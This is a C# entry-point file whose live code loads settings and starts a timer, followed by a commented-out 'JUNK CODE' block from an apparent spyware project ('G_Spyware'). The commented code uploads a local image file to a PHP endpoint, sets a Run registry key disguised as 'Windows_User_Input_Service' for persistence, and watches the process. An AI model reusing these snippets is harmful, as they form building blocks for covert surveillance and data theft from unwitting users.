namespace IDK {

    /// <summary>
    /// Main class of the program
    /// </summary>
    class Program {

        /// <summary>
        /// Entry point of the program
        /// </summary>
        /// <param name="args">arguments for the program</param>
        public static void Main(string[] args) {
            Config config = Config.GetInstance();
            config.LoadSettings();

            Clock clock = new Clock(config.Settings.CLOCK_TIME);
            clock.Start();
        }
    }
}

/********************* JUNK CODE *************************/


//Console.WriteLine("Starting");
//Thread.Sleep(5000);

//HttpWebRequest req = (HttpWebRequest) WebRequest.Create("http://localhost/G_Spyware/");
//req.Method = "GET";
//req.Timeout = 10000;

//WebResponse res = req.GetResponse();

//using (StreamReader reader = new StreamReader(res.GetResponseStream())) {
//    Console.WriteLine(reader.ReadToEnd());
//}

//res.Close();

//Console.ReadLine();

//WebClient client = new WebClient();

//string uri = "http://localhost/G_Spyware/index.php";
//string fileName = new FileInfo("data.png").FullName;

//byte[] response = client.UploadFile(uri, fileName);

//Console.WriteLine("\nResponse Received.The contents of the file uploaded are:\n{0}",
//    System.Text.Encoding.ASCII.GetString(response));

//Console.ReadLine();


// SendKeys.SendWait("key")
// RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
// key.SetValue("Windows_User_Input_Service", Application.ExecutablePath);
// RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
// key.DeleteValue("Windows_User_Input_Service", false);

//ProcessStartInfo info = new ProcessStartInfo("C:\\Users\\gasis\\Desktop\\IDK.exe");
//info.UseShellExecute = true;
//info.CreateNoWindow = false;

//Process process = Process.Start(info);
//int id = process.Id;

//while (true) {
//    using (StreamWriter writer = File.AppendText("log.txt")) {
//        try {
//            Process proc = Process.GetProcessById(id);
//            writer.WriteLine("Process running.");
//        } catch (ArgumentException) {
//            writer.WriteLine("Process not running.");
//        }
//    }

//    Thread.Sleep(10000);
//}